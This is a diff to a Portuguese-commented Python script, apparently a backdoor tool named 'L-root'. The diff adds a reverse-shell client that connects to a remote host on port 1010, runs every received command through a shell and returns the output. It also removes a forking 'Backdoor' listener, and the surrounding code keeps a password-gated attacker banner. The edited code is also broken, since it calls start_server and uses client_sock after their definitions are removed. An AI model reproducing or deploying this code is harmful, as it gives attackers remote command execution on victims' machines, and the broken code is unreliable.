@@ -16,7 +16,7 @@ if sys.version_info < MIN_PYTHON_VERSION:
     print(f"A instalação do L-root será interrompida porque a versão mínima do Python exigida é {MIN_PYTHON[0]}. ou superior. Você está executando o Python {sys.version}. Você pode instalar a versão Python compatível manualmente.")
     sys.exit(1)
 else:
-    print("Versão compatível do Python detectada. Continuando a instalação...")
+    print("[+] Versão compatível do Python detectada. Continuando a instalação...")
 
 
 black='\033[0;90m'
@@ -171,14 +171,64 @@ else:
     print("Usuário incorreto!")
     # código para executar se o usuário estiver incorreto
 
+#CLIENTE
+REMOTE_HOST = '' # sem nada e o localhost
+REMOTE_PORT = 1010 # porta da coneexão
+client = socket.socket()
+print("[-] Iniciando conexão...")
+client.connect((REMOTE_HOST, REMOTE_PORT))
+print("[-] Coexão iniciada!")
+ 
+while True:
+    print("[-] Aguardando comandos...")
+    command = client.recv(1024)
+    command = command.decode()
+    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+    output = op.stdout.read()
+    output_error = op.stderr.read()
+    print("[-] mandando resposta...")
+    client.send(output + output_error)
 
-# Cria um objeto socket
-server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+# servidor socket
 
-server_sock.bind((SERVER_HOST, SERVER_PORT))
+HOST = '127.0.0.1'  # endereço do servidor (em branco significa que irá usar o endereço local)
+PORT = 1010  # porta de conexão
 
-# Conecta ao cliente e define a variável client_sock como o objeto socket do cliente
-client_sock, address = server_sock.accept()
+# cria um socket TCP
+server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# vincula o socket com o endereço e porta
+server_socket.bind((HOST, PORT))
+
+# define o número máximo de conexões pendentes
+server_socket.listen(1)
+
+print('Aguardando conexão...')
+
+# espera por uma conexão
+client_socket, client_address = server_socket.accept()
+
+print('Conectado por', client_address)
+
+# loop principal
+while True:
+    # recebe dados do cliente
+    data = client_socket.recv(1024)
+
+    if not data:
+        break
+
+    # processa os dados recebidos
+    # exemplo: converte os dados para maiúsculas e envia de volta para o cliente
+    response = data.upper()
+
+    # envia a resposta para o cliente
+    client_socket.sendall(response)
+
+# fecha o socket
+client_socket.close()
+server_socket.close()
+
 
 client_sock.send(b'\033c')
 client_sock.send(f'{banner_reaper}\n'.encode())
@@ -214,26 +264,7 @@ else:
          client_sock.send(f'\n[{red}\o/ Wrong Passowrd{off}]\n'.encode())
          client_sock.close()
 
-def start_server():
-    #cria um objeto socket
-    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server_sock.listen(5)
-    server_sock.bind((SERVER_HOST, SERVER_PORT))
-    print(f"{green}[+] A porta do Backdoor foi aberta em {off} {SERVER_PORT}")
-    while True:
-        client_sock, addr = server_sock.accept()
-        print(f"{green}[+] User Connect: {addr}")
-        pid = os.fork()
-        if pid == 0:
-            server_sock.close()
-            handle_client(client_sock)
-            client_sock.close()
-            os._exit(0)
-        else:
-            client_sock.close()
-
-
+#aqui vai ficar o start server
 if __name__ == '__main__':
     start_server()
     ghost()
